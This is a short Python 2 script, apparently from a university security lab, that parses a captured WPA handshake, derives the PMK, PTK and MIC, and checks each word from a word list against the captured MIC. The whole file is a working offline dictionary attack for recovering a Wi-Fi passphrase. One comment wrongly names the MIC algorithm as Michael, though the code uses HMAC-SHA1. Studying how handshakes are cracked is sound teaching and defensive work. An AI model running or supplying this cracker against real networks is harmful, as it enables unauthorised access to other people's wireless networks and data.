#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Derive WPA keys from Passphrase and 4-way handshake info

Calcule un MIC d'authentification (le MIC pour la transmission de données
utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
sha-1 pour WPA2 ou MD5 pour WPA)
"""

__author__      = "Abraham Rubinstein"
__copyright__   = "Copyright 2017, HEIG-VD"
__license__ 	= "GPL"
__version__ 	= "1.0"
__email__ 		= "abraham.rubinstein@heig-vd.ch"
__status__ 		= "Prototype"

from scapy.all import *
from binascii import a2b_hex, b2a_hex
from pbkdf2_math import pbkdf2_hex
from numpy import array_split
from numpy import array
import hmac, hashlib

# Read capture file -- it contains beacon, authentication, associacion, handshake and data
wpa=rdpcap("wpa_handshake.cap") 



# Important parameters for key derivation - most of them can be obtained from the pcap file
passPhrase  = "actuelle"
A           = "Pairwise key expansion" #this string is used in the pseudo-random function


ssid        = wpa[0].info
APmac       = a2b_hex(wpa[0].addr2.replace(":",""))
Clientmac   = a2b_hex(wpa[1].addr1.replace(":",""))
ANonce      = (wpa[5].load)[13:45]
SNonce      = (wpa[6].load)[13:45]
micOriginal = b2a_hex((wpa[8].load)[77:93])

B           = min(APmac,Clientmac)+max(APmac,Clientmac)+min(ANonce,SNonce)+max(ANonce,SNonce) #used in pseudo-random function

#String used to replace the mic in the raw data
replaceStr 	= "0" * len(micOriginal)

data        = b2a_hex(str((wpa[8])[EAPOL]))
data 		= data.replace(micOriginal,replaceStr)
data 		= a2b_hex(data)


def customPRF512(key,A,B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i    = 0
    R    = ''
    while i<=((blen*8+159)/160):
        hmacsha1 = hmac.new(key,A+chr(0x00)+B+chr(i),hashlib.sha1)
        i+=1
        R = R+hmacsha1.digest()
    return R[:blen]

def testWord(passPhrase):
	"""
	This function take a passphrase, generate the mic and say if its equal to orignal
	or not.
	"""

	micToCompare = generateMic(passPhrase)

	print "Passphrase testée: " + passPhrase
	print "================================================"
	print "Mic original: " + micOriginal
	print "Mic à comparer: " + micToCompare

	if micToCompare == micOriginal:
		print "La passphrase utilisée est correcte !\n"
	else:
		print "Echec: essayer avec une nouvelle passphrase !\n"

def generateMic(passPhrase):
	"""
	This function generate a mic from a passphrase.
	"""

	#calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
	pmk = pbkdf2_hex(passPhrase, ssid, 4096, 32)

	#expand pmk to obtain PTK
	ptk = customPRF512(a2b_hex(pmk),A,B)

	#calculate MIC over EAPOL payload (Michael)- The ptk is, in fact, KCK|KEK|TK|MICK
	mic = hmac.new(ptk[0:16],data,hashlib.sha1)

	mic = mic.hexdigest()[:32]

	return mic

def testWordList():

	#This function test each passphrase from a word list

    # Open the UNIX dictonary of words.
    with open('words.txt', 'r') as f:
    	words = f.read().split()

    # Loop over all the words.
    for word in words:
		testWord(word)

# Execute the script
testWordList()


